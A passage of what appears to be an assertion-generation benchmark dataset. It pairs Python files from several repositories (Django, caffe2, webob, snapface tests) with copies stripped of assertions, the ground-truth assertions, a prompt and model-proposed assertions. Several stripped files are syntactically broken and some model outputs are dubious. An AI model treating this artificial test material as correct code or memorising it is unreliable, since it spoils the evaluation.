4from factories import factories as f
5from karspexet.venue.models import Seat
6
7
8class TestVenueViews(TestCase):
9    def setUp(self):
10        staff = f.CreateStaffUser()
11        self.client.force_login(staff)
12
13    def test_manage_seats(self):
14        venue = f.CreateVenue()
15        group = f.CreateSeatingGroup(venue=venue)
16
17        url = reverse(""manage_seats"", args=[venue.id])
18        response = self.client.get(url)
19
20        response = self.client.post(url, data={""group"": group.id, ""num_seats"": 2})
21",2034,"[[10, 'staff', '!=', None, ""the setUp method should create a staff user""],
 [14, 'venue', '!=', None, ""the test_manage_seats method should create a venue""],
 [15, 'group', '!=', None, ""the test_manage_seats method should create a seating group""],
 [18, 'response', '!=', None, ""the test_manage_seats method should receive a response for the get request""],
 [20, 'response', '!=', None, ""the test_manage_seats method should receive a response for the post request""]]"
h4ck3rm1k3/gcc-python-plugin-1,"#   Copyright 2011 David Malcolm <dmalcolm@redhat.com>
#   Copyright 2011 Red Hat, Inc.
#
#   This is free software: you can redistribute it and/or modify it
#   under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful, but
#   WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
#   General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see
#   <http://www.gnu.org/licenses/>.

import gcc
from libcpychecker import main, get_traces

def verify_traces(optpass, fun):
    # Only run in one pass
    # FIXME: should we be adding our own pass for this?
    if optpass.name == '*warn_function_return':
        if fun:
            traces = get_traces(fun)

            # We should have a single trace
            #print('traces: %r' % traces)
            assert len(traces) == 1
            state = traces[0].states[-1]
            print('_Py_NoneStruct.ob_refcnt: %s'
                  % state.get_value_of_field_by_varname('_Py_NoneStruct', 'ob_refcnt'))
            print('state.return_rvalue: %r' % state.return_rvalue)

gcc.register_callback(gcc.PLUGIN_PASS_EXECUTION,
                      verify_traces)

main(verify_refcounting=True)
","
1#   Copyright 2011 David Malcolm <dmalcolm@redhat.com>
2#   Copyright 2011 Red Hat, Inc.
3#
4#   This is free software: you can redistribute it and/or modify it
5#   under the terms of the GNU General Public License as published by
6#   the Free Software Foundation, either version 3 of the License, or
7#   (at your option) any later version.
8#
9#   This program is distributed in the hope that it will be useful, but
10#   WITHOUT ANY WARRANTY; without even the implied warranty of
11#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
12#   General Public License for more details.
13#
14#   You should have received a copy of the GNU General Public License
15#   along with this program.  If not, see
16#   <http://www.gnu.org/licenses/>.
17
18import gcc
19from libcpychecker import main, get_traces
20
21def verify_traces(optpass, fun):
22    # Only run in one pass
23    # FIXME: should we be adding our own pass for this?
24    if optpass.name == '*warn_function_return':
25        if fun:
26            traces = get_traces(fun)
27
28            # We should have a single trace
29            #print('traces: %r' % traces)
30            state = traces[0].states[-1]
31            print('_Py_NoneStruct.ob_refcnt: %s'
32                  % state.get_value_of_field_by_varname('_Py_NoneStruct', 'ob_refcnt'))
33            print('state.return_rvalue: %r' % state.return_rvalue)
34
35gcc.register_callback(gcc.PLUGIN_PASS_EXECUTION,
36                      verify_traces)
37
38main(verify_refcounting=True)
39","[['len(traces)', '==', '1']]",1,1,1.0,0.000667111407605,"['optpass', 'fun', 'traces', 'state']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['optpass', 'fun', 'traces', 'state']
*Code:

1#   Copyright 2011 David Malcolm <dmalcolm@redhat.com>
2#   Copyright 2011 Red Hat, Inc.
3#
4#   This is free software: you can redistribute it and/or modify it
5#   under the terms of the GNU General Public License as published by
6#   the Free Software Foundation, either version 3 of the License, or
7#   (at your option) any later version.
8#
9#   This program is distributed in the hope that it will be useful, but
10#   WITHOUT ANY WARRANTY; without even the implied warranty of
11#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
12#   General Public License for more details.
13#
14#   You should have received a copy of the GNU General Public License
15#   along with this program.  If not, see
16#   <http://www.gnu.org/licenses/>.
17
18import gcc
19from libcpychecker import main, get_traces
20
21def verify_traces(optpass, fun):
22    # Only run in one pass
23    # FIXME: should we be adding our own pass for this?
24    if optpass.name == '*warn_function_return':
25        if fun:
26            traces = get_traces(fun)
27
28            # We should have a single trace
29            #print('traces: %r' % traces)
30            state = traces[0].states[-1]
31            print('_Py_NoneStruct.ob_refcnt: %s'
32                  % state.get_value_of_field_by_varname('_Py_NoneStruct', 'ob_refcnt'))
33            print('state.return_rvalue: %r' % state.return_rvalue)
34
35gcc.register_callback(gcc.PLUGIN_PASS_EXECUTION,
36                      verify_traces)
37
38main(verify_refcounting=True)
39",2950,"[[21, 'optpass', '!=', None, ""optpass parameter should be provided""],
 [21, 'fun', '!=', None, ""fun parameter should be provided""],
 [26, 'traces', '!=', None, ""traces variable needs to have a value""],
 [30, 'state', '!=', None, ""state variable needs to have a value""]]"
prat0318/swagger-py,"from __future__ import print_function
import pytest


def test_success(petstore):
    result = petstore.pet.updatePetWithForm(
        petId='1',
        name='darwin',
        status='available').result()
    print(result)
    assert result


@pytest.mark.xfail(reason=""Don't know now to cause a 405"")
def test_405_invalid_input():
    assert False
","
1from __future__ import print_function
2import pytest
3
4
5def test_success(petstore):
6    result = petstore.pet.updatePetWithForm(
7        petId='1',
8        name='darwin',
9        status='available').result()
10    print(result)
11
12
13@pytest.mark.xfail(reason=""Don't know now to cause a 405"")
14def test_405_invalid_input():
15","[['result', '==', 'True'], ['False', '==', 'True']]",2,2,1.0,0.0057142857142857,"['petstore', 'result']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['petstore', 'result']
*Code:

1from __future__ import print_function
2import pytest
3
4
5def test_success(petstore):
6    result = petstore.pet.updatePetWithForm(
7        petId='1',
8        name='darwin',
9        status='available').result()
10    print(result)
11
12
13@pytest.mark.xfail(reason=""Don't know now to cause a 405"")
14def test_405_invalid_input():
15",1739,"[[5, 'petstore', '!=', None, ""The function needs petstore object to perform operations""],
[6, 'result', '!=', None, ""Assert that result of the operation is not None""]]"
davinwang/caffe2,"# Copyright (c) 2016-present, Facebook, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
##############################################################################

## @package sampling_train
# Module caffe2.python.layers.sampling_train
from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from caffe2.python import schema
from caffe2.python.layers.layers import ModelLayer, get_layer_class
from caffe2.python.layers.sampling_trainable_mixin import SamplingTrainableMixin


class SamplingTrain(ModelLayer):
    def __init__(
        self,
        model,
        input_record,
        prediction_layer,
        output_dims,
        subtract_log_odd=True,
        name='sampling_train',
        **kwargs
    ):
        super(SamplingTrain, self).__init__(
            model, name, input_record, **kwargs
        )

        layer_class = get_layer_class(prediction_layer)
        assert issubclass(layer_class, SamplingTrainableMixin)

        assert 'indices' in input_record
        assert isinstance(input_record.indices, schema.Scalar),\
            ""input_record.indices is expected to be a schema.Scalar""
        assert 'input' in input_record

        self.subtract_log_odd = subtract_log_odd
        if self.subtract_log_odd:
            assert 'sampling_prob' in input_record

        self._prediction_layer = layer_class(
            model,
            input_record.input,
            output_dims=output_dims,
            **kwargs
        )

        self._prediction_layer.train_param_blobs = [
            model.net.NextBlob(str(blob) + '_sampled')
            for blob in self._prediction_layer.param_blobs
        ]

        self.params = self._prediction_layer.params

        self.output_schema = self._prediction_layer.output_schema

    def add_ops(self, net):
        self._prediction_layer.add_ops(net)

    def add_train_ops(self, net):
        for full_blob, sampled_blob in zip(
            self._prediction_layer.param_blobs,
            self._prediction_layer.train_param_blobs
        ):
            net.Gather([full_blob, self.input_record.indices()], sampled_blob)
        self._prediction_layer.add_train_ops(net)
        if not self.subtract_log_odd:
            return
        log_q = net.Log(self.input_record.sampling_prob(),
                        net.NextScopedBlob(""log_q""))
        net.Sub([self.output_schema(), log_q], self.output_schema(),
                broadcast=1, use_grad_hack=1)
","
1# Copyright (c) 2016-present, Facebook, Inc.
2#
3# Licensed under the Apache License, Version 2.0 (the ""License"");
4# you may not use this file except in compliance with the License.
5# You may obtain a copy of the License at
6#
7#     http://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software
10# distributed under the License is distributed on an ""AS IS"" BASIS,
11# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12# See the License for the specific language governing permissions and
13# limitations under the License.
14##############################################################################
15
16## @package sampling_train
17# Module caffe2.python.layers.sampling_train
18from __future__ import absolute_import
19from __future__ import division
20from __future__ import print_function
21from __future__ import unicode_literals
22
23from caffe2.python import schema
24from caffe2.python.layers.layers import ModelLayer, get_layer_class
25from caffe2.python.layers.sampling_trainable_mixin import SamplingTrainableMixin
26
27
28class SamplingTrain(ModelLayer):
29    def __init__(
30        self,
31        model,
32        input_record,
33        prediction_layer,
34        output_dims,
35        subtract_log_odd=True,
36        name='sampling_train',
37        **kwargs
38    ):
39        super(SamplingTrain, self).__init__(
40            model, name, input_record, **kwargs
41        )
42
43        layer_class = get_layer_class(prediction_layer)
44
45            ""input_record.indices is expected to be a schema.Scalar""
46
47        self.subtract_log_odd = subtract_log_odd
48        if self.subtract_log_odd:
49
50        self._prediction_layer = layer_class(
51            model,
52            input_record.input,
53            output_dims=output_dims,
54            **kwargs
55        )
56
57        self._prediction_layer.train_param_blobs = [
58            model.net.NextBlob(str(blob) + '_sampled')
59            for blob in self._prediction_layer.param_blobs
60        ]
61
62        self.params = self._prediction_layer.params
63
64        self.output_schema = self._prediction_layer.output_schema
65
66    def add_ops(self, net):
67        self._prediction_layer.add_ops(net)
68
69    def add_train_ops(self, net):
70        for full_blob, sampled_blob in zip(
71            self._prediction_layer.param_blobs,
72            self._prediction_layer.train_param_blobs
73        ):
74            net.Gather([full_blob, self.input_record.indices()], sampled_blob)
75        self._prediction_layer.add_train_ops(net)
76        if not self.subtract_log_odd:
77            return
78        log_q = net.Log(self.input_record.sampling_prob(),
79                        net.NextScopedBlob(""log_q""))
80        net.Sub([self.output_schema(), log_q], self.output_schema(),
81                broadcast=1, use_grad_hack=1)
82","[['issubclass(layer_class', '==', 'True']]",5,1,0.2,0.0003304692663582,"['layer_class', 'self.subtract_log_odd', 'self._prediction_layer', 'self._prediction_layer.train_param_blobs', 'self.params', 'self.output_schema', 'net', 'log_q']",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['layer_class', 'self.subtract_log_odd', 'self._prediction_layer', 'self._prediction_layer.train_param_blobs', 'self.params', 'self.output_schema', 'net', 'log_q']
*Code:

1# Copyright (c) 2016-present, Facebook, Inc.
2#
3# Licensed under the Apache License, Version 2.0 (the ""License"");
4# you may not use this file except in compliance with the License.
5# You may obtain a copy of the License at
6#
7#     http://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software
10# distributed under the License is distributed on an ""AS IS"" BASIS,
11# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12# See the License for the specific language governing permissions and
13# limitations under the License.
14##############################################################################
15
16## @package sampling_train
17# Module caffe2.python.layers.sampling_train
18from __future__ import absolute_import
19from __future__ import division
20from __future__ import print_function
21from __future__ import unicode_literals
22
23from caffe2.python import schema
24from caffe2.python.layers.layers import ModelLayer, get_layer_class
25from caffe2.python.layers.sampling_trainable_mixin import SamplingTrainableMixin
26
27
28class SamplingTrain(ModelLayer):
29    def __init__(
30        self,
31        model,
32        input_record,
33        prediction_layer,
34        output_dims,
35        subtract_log_odd=True,
36        name='sampling_train',
37        **kwargs
38    ):
39        super(SamplingTrain, self).__init__(
40            model, name, input_record, **kwargs
41        )
42
43        layer_class = get_layer_class(prediction_layer)
44
45            ""input_record.indices is expected to be a schema.Scalar""
46
47        self.subtract_log_odd = subtract_log_odd
48        if self.subtract_log_odd:
49
50        self._prediction_layer = layer_class(
51            model,
52            input_record.input,
53            output_dims=output_dims,
54            **kwargs
55        )
56
57        self._prediction_layer.train_param_blobs = [
58            model.net.NextBlob(str(blob) + '_sampled')
59            for blob in self._prediction_layer.param_blobs
60        ]
61
62        self.params = self._prediction_layer.params
63
64        self.output_schema = self._prediction_layer.output_schema
65
66    def add_ops(self, net):
67        self._prediction_layer.add_ops(net)
68
69    def add_train_ops(self, net):
70        for full_blob, sampled_blob in zip(
71            self._prediction_layer.param_blobs,
72            self._prediction_layer.train_param_blobs
73        ):
74            net.Gather([full_blob, self.input_record.indices()], sampled_blob)
75        self._prediction_layer.add_train_ops(net)
76        if not self.subtract_log_odd:
77            return
78        log_q = net.Log(self.input_record.sampling_prob(),
79                        net.NextScopedBlob(""log_q""))
80        net.Sub([self.output_schema(), log_q], self.output_schema(),
81                broadcast=1, use_grad_hack=1)
82",4466,"[[43, 'layer_class', '!=', None, ""layer_class must be initialized for the prediction layer""], 
 [53, 'output_dims', '>=', 1, ""output dimensions should be at least 1""], 
 [47, 'self.subtract_log_odd', '==', bool, ""subtract_log_odd should be a boolean""], 
 [55, 'self._prediction_layer', '!=', None, ""prediction_layer must be initialized""], 
 [64, 'self.output_schema', '!=', None, ""output_schema must be initialized""], 
 [66, 'net', '!=', None, ""Network must be initialized""], 
 [79, 'log_q', '!=', None, ""log_q must be initialized""]]"
krekle/snapface,"# -*- coding: utf-8 -*-
""""""Model unit tests.""""""
import datetime as dt

import pytest

from snapface.user.models import User, Role
from .factories import UserFactory

@pytest.mark.usefixtures('db')
class TestUser:

    def test_get_by_id(self):
        user = User('foo', 'foo@bar.com')
        user.save()

        retrieved = User.get_by_id(user.id)
        assert retrieved == user

    def test_created_at_defaults_to_datetime(self):
        user = User(username='foo', email='foo@bar.com')
        user.save()
        assert bool(user.created_at)
        assert isinstance(user.created_at, dt.datetime)

    def test_password_is_nullable(self):
        user = User(username='foo', email='foo@bar.com')
        user.save()
        assert user.password is None

    def test_factory(self, db):
        user = UserFactory(password=""myprecious"")
        db.session.commit()
        assert bool(user.username)
        assert bool(user.email)
        assert bool(user.created_at)
        assert user.is_admin is False
        assert user.active is True
        assert user.check_password('myprecious')

    def test_check_password(self):
        user = User.create(username=""foo"", email=""foo@bar.com"",
                    password=""foobarbaz123"")
        assert user.check_password('foobarbaz123') is True
        assert user.check_password(""barfoobaz"") is False

    def test_full_name(self):
        user = UserFactory(first_name=""Foo"", last_name=""Bar"")
        assert user.full_name == ""Foo Bar""

    def test_roles(self):
        role = Role(name='admin')
        role.save()
        u = UserFactory()
        u.roles.append(role)
        u.save()
        assert role in u.roles
","
1# -*- coding: utf-8 -*-
2""""""Model unit tests.""""""
3import datetime as dt
4
5import pytest
6
7from snapface.user.models import User, Role
8from .factories import UserFactory
9
10@pytest.mark.usefixtures('db')
11class TestUser:
12
13    def test_get_by_id(self):
14        user = User('foo', 'foo@bar.com')
15        user.save()
16
17        retrieved = User.get_by_id(user.id)
18
19    def test_created_at_defaults_to_datetime(self):
20        user = User(username='foo', email='foo@bar.com')
21        user.save()
22
23    def test_password_is_nullable(self):
24        user = User(username='foo', email='foo@bar.com')
25        user.save()
26
27    def test_factory(self, db):
28        user = UserFactory(password=""myprecious"")
29        db.session.commit()
30
31    def test_check_password(self):
32        user = User.create(username=""foo"", email=""foo@bar.com"",
33                    password=""foobarbaz123"")
34
35    def test_full_name(self):
36        user = UserFactory(first_name=""Foo"", last_name=""Bar"")
37
38    def test_roles(self):
39        role = Role(name='admin')
40        role.save()
41        u = UserFactory()
42        u.roles.append(role)
43        u.save()
44","[['retrieved', '==', 'user'], ['bool(user.created_at)', '==', 'True'], ['user.password', '==', 'None'], ['bool(user.username)', '==', 'True'], ['bool(user.email)', '==', 'True'], ['bool(user.created_at)', '==', 'True'], ['user.is_admin', '==', 'False'], ['user.active', '==', 'True'], [""user.check_password('myprecious')"", '==', 'True'], [""user.check_password('foobarbaz123')"", '==', 'True'], ['user.check_password(""barfoobaz"")', '==', 'False'], ['user.full_name', '==', '""Foo Bar""']]",14,12,0.8571428571428571,0.0071386079714455,"['user', 'retrieved', 'db', 'role', 'u']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['user', 'retrieved', 'db', 'role', 'u']
*Code:

1# -*- coding: utf-8 -*-
2""""""Model unit tests.""""""
3import datetime as dt
4
5import pytest
6
7from snapface.user.models import User, Role
8from .factories import UserFactory
9
10@pytest.mark.usefixtures('db')
11class TestUser:
12
13    def test_get_by_id(self):
14        user = User('foo', 'foo@bar.com')
15        user.save()
16
17        retrieved = User.get_by_id(user.id)
18
19    def test_created_at_defaults_to_datetime(self):
20        user = User(username='foo', email='foo@bar.com')
21        user.save()
22
23    def test_password_is_nullable(self):
24        user = User(username='foo', email='foo@bar.com')
25        user.save()
26
27    def test_factory(self, db):
28        user = UserFactory(password=""myprecious"")
29        db.session.commit()
30
31    def test_check_password(self):
32        user = User.create(username=""foo"", email=""foo@bar.com"",
33                    password=""foobarbaz123"")
34
35    def test_full_name(self):
36        user = UserFactory(first_name=""Foo"", last_name=""Bar"")
37
38    def test_roles(self):
39        role = Role(name='admin')
40        role.save()
41        u = UserFactory()
42        u.roles.append(role)
43        u.save()
44",2602,"[[13, 'user', '!=', None, ""User object must be created successfully""], 
 [17, 'retrieved', '==', 'user', ""Retrieved user must be the same as the original one""], 
 [28, 'user', '!=', None, ""User object must be created successfully""], 
 [31, 'user', '!=', None, ""User object must be created successfully""], 
 [36, 'user', '!=', None, ""User object must be created successfully""], 
 [39, 'role', '!=', None, ""Role object must be created successfully""], 
 [41, 'u', '!=', None, ""User object must be created successfully""], 
 [42, 'u.roles', '==', ['role'], ""User roles should include the appended role""],
 [43, 'u.roles', '==', ['role'], ""User roles should not be changed after being saved""]]"
ioram7/keystone-federado-pgid2013,"# coding: cp1251
from webob.request import Request, Transcoder
from webob.response import Response
from webob.compat import text_, native_
from nose.tools import eq_

# def tapp(env, sr):
#     req = Request(env)
#     r = Response(str(req))
#     #r = Response(str(dict(req.POST)))
#     return r(env, sr)

t1 = b'--BOUNDARY\r\nContent-Disposition: form-data; name=""a""\r\n\r\n\xea\xf3...\r\n--BOUNDARY--'
t2 = b'--BOUNDARY\r\nContent-Disposition: form-data; name=""a""; filename=""file""\r\n\r\n\xea\xf3...\r\n--BOUNDARY--'
t3 = b'--BOUNDARY\r\nContent-Disposition: form-data; name=""a""; filename=""\xea\xf3...""\r\n\r\nfoo\r\n--BOUNDARY--'

def test_transcode():
    def tapp(env, sr):
        req = Request(env)
        #import pprint; pprint.pprint(req.environ)
        #print(req.body)
        req = req.decode()
        #import pprint; pprint.pprint(req.environ)
        #print(req.body)
        v = req.POST[req.query_string]
        if hasattr(v, 'filename'):
            r = Response(text_('%s\n%r' % (v.filename, v.value)))
        else:
            r = Response(v)
        return r(env, sr)
    text = b'\xea\xf3...'.decode('cp1251')
    def test(post):
        req = Request.blank('/?a', POST=post)
        req.environ['CONTENT_TYPE'] = 'multipart/form-data; charset=windows-1251; boundary=BOUNDARY'
        return req.get_response(tapp)

    r = test(t1)
    eq_(r.text, text)
    r = test(t2)
    eq_(r.text, 'file\n%r' % text.encode('cp1251'))
    r = test(t3)
    eq_(r.text, ""%s\n%r"" % (text, b'foo'))

    #req = Request.blank('/?a', POST={'a': ('file', text.encode('cp1251'))},


    # req = Request({}, charset='utf8')
    # req = Request({})
    # print req.charset
    # print req._charset_cache
    # print req.environ.get('CONTENT_TYPE')
    #print '\xd0\xba\xd1\x83...'.decode('utf8').encode('cp1251')
    #print u'\u043a'.encode('cp1251')

def test_transcode_query():
    req = Request.blank('/?%EF%F0%E8=%E2%E5%F2')
    req2 = req.decode('cp1251')
    eq_(req2.query_string, '%D0%BF%D1%80%D0%B8=%D0%B2%D0%B5%D1%82')

def test_transcode_non_multipart():
    req = Request.blank('/?a', POST='%EF%F0%E8=%E2%E5%F2')
    req._content_type_raw = 'application/x-www-form-urlencoded'
    req2 = req.decode('cp1251')
    eq_(native_(req2.body), '%D0%BF%D1%80%D0%B8=%D0%B2%D0%B5%D1%82')

def test_transcode_non_form():
    req = Request.blank('/?a', POST='%EF%F0%E8=%E2%E5%F2')
    req._content_type_raw = 'application/x-foo'
    req2 = req.decode('cp1251')
    eq_(native_(req2.body), '%EF%F0%E8=%E2%E5%F2')

def test_transcode_noop():
    req = Request.blank('/')
    assert req.decode() is req

def test_transcode_query():
    t = Transcoder('ascii')
    eq_(t.transcode_query('a'), 'a')
","
1# coding: cp1251
2from webob.request import Request, Transcoder
3from webob.response import Response
4from webob.compat import text_, native_
5from nose.tools import eq_
6
7# def tapp(env, sr):
8#     req = Request(env)
9#     r = Response(str(req))
10#     #r = Response(str(dict(req.POST)))
11#     return r(env, sr)
12
13t1 = b'--BOUNDARY\r\nContent-Disposition: form-data; name=""a""\r\n\r\n\xea\xf3...\r\n--BOUNDARY--'
14t2 = b'--BOUNDARY\r\nContent-Disposition: form-data; name=""a""; filename=""file""\r\n\r\n\xea\xf3...\r\n--BOUNDARY--'
15t3 = b'--BOUNDARY\r\nContent-Disposition: form-data; name=""a""; filename=""\xea\xf3...""\r\n\r\nfoo\r\n--BOUNDARY--'
16
17def test_transcode():
18    def tapp(env, sr):
19        req = Request(env)
20        #import pprint; pprint.pprint(req.environ)
21        #print(req.body)
22        req = req.decode()
23        #import pprint; pprint.pprint(req.environ)
24        #print(req.body)
25        v = req.POST[req.query_string]
26        if hasattr(v, 'filename'):
27            r = Response(text_('%s\n%r' % (v.filename, v.value)))
28        else:
29            r = Response(v)
30        return r(env, sr)
31    text = b'\xea\xf3...'.decode('cp1251')
32    def test(post):
33        req = Request.blank('/?a', POST=post)
34        req.environ['CONTENT_TYPE'] = 'multipart/form-data; charset=windows-1251; boundary=BOUNDARY'
35        return req.get_response(tapp)
36
37    r = test(t1)
38    eq_(r.text, text)
39    r = test(t2)
40    eq_(r.text, 'file\n%r' % text.encode('cp1251'))
41    r = test(t3)
42    eq_(r.text, ""%s\n%r"" % (text, b'foo'))
43
44    #req = Request.blank('/?a', POST={'a': ('file', text.encode('cp1251'))},
45
46
47    # req = Request({}, charset='utf8')
48    # req = Request({})
49    # print req.charset
50    # print req._charset_cache
51    # print req.environ.get('CONTENT_TYPE')
52    #print '\xd0\xba\xd1\x83...'.decode('utf8').encode('cp1251')
53    #print u'\u043a'.encode('cp1251')
54
55def test_transcode_query():
56    req = Request.blank('/?%EF%F0%E8=%E2%E5%F2')
57    req2 = req.decode('cp1251')
58    eq_(req2.query_string, '%D0%BF%D1%80%D0%B8=%D0%B2%D0%B5%D1%82')
59
60def test_transcode_non_multipart():
61    req = Request.blank('/?a', POST='%EF%F0%E8=%E2%E5%F2')
62    req._content_type_raw = 'application/x-www-form-urlencoded'
63    req2 = req.decode('cp1251')
64    eq_(native_(req2.body), '%D0%BF%D1%80%D0%B8=%D0%B2%D0%B5%D1%82')
65
66def test_transcode_non_form():
67    req = Request.blank('/?a', POST='%EF%F0%E8=%E2%E5%F2')
68    req._content_type_raw = 'application/x-foo'
69    req2 = req.decode('cp1251')
70    eq_(native_(req2.body), '%EF%F0%E8=%E2%E5%F2')
71
72def test_transcode_noop():
73    req = Request.blank('/')
74
75def test_transcode_query():
76    t = Transcoder('ascii')
77    eq_(t.transcode_query('a'), 'a')
78","[['req.decode()', '==', 'req']]",1,1,1.0,0.0003702332469455,"['env', 'sr', '#     req', '#     r', '#     #r', 't1', 't2', 't3', 'req', 'v', 'r', 'text', 'post', ""req.environ['CONTENT_TYPE']"", '#req', '# req', 'req2', 'req._content_type_raw', 't']",19,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['env', 'sr', '#     req', '#     r', '#     #r', 't1', 't2', 't3', 'req', 'v', 'r', 'text', 'post', ""req.environ['CONTENT_TYPE']"", '#req', '# req', 'req2', 'req._content_type_raw', 't']
*Code:

1# coding: cp1251
2from webob.request import Request, Transcoder
3from webob.response import Response
4from webob.compat import text_, native_
5from nose.tools import eq_
6
7# def tapp(env, sr):
8#     req = Request(env)
9#     r = Response(str(req))
10#     #r = Response(str(dict(req.POST)))
11#     return r(env, sr)
12
13t1 = b'--BOUNDARY\r\nContent-Disposition: form-data; name=""a""\r\n\r\n\xea\xf3...\r\n--BOUNDARY--'
14t2 = b'--BOUNDARY\r\nContent-Disposition: form-data; name=""a""; filename=""file""\r\n\r\n\xea\xf3...\r\n--BOUNDARY--'
15t3 = b'--BOUNDARY\r\nContent-Disposition: form-data; name=""a""; filename=""\xea\xf3...""\r\n\r\nfoo\r\n--BOUNDARY--'
16
17def test_transcode():
18    def tapp(env, sr):
19        req = Request(env)
20        #import pprint; pprint.pprint(req.environ)
21        #print(req.body)
22        req = req.decode()
23        #import pprint; pprint.pprint(req.environ)
24        #print(req.body)
25        v = req.POST[req.query_string]
